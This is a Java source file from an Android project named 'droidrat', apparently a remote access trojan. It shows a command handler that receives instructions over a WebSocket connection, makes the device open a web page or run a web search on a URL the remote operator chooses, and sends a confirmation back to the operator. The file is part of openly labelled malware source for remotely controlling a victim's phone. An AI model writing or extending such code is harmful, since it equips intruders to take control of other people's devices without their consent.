package com.je_chen.droidrat_je.rat.command;

import android.content.Context;
import android.util.Log;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.appintent.web.Web;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.droidRatWebSocketClient;

public class WebCommand extends CommandFather {

    private final Web web;

    private final Context context;

    public WebCommand(Context context) {
        this.context = context;
        web = new Web();
    }

    @Override
    public void send(String value) {
        droidRatWebSocketClient.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            String TAG = "Web Event ";
            switch (rawCommandArray[1]) {
                case "WebSearch":
                    String webUri1 = rawCommandArray[2];
                    Log.d(TAG, "Web ern search " + webUri1);
                    web.webSearch(context, webUri1);
                    this.send("Web web search" + webUri1);
                    break;

                case "OpenWeb":
                    String webUri2 = rawCommandArray[2];
                    Log.d(TAG, "Web open web " + webUri2);
                    web.openWeb(context, webUri2);
                    this.send("Web open web " + webUri2);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
